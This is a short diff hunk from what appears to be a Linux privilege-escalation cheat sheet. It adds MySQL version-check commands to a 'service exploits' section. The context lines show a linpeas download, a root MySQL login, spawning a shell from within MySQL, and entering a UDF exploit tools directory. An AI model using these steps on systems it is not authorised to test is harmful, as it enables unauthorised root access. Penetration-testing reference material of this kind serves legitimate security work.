@@ -134,6 +134,9 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 ## CATEGORY "SERVICES" - SERVICE EXPLOITS
 ```
+mysql> show variables like '%version%';
+$ mysql -V
+$ mysql --version
 mysql -u root -p
 \! sh
 cd /home/user/tools/mysql-udf
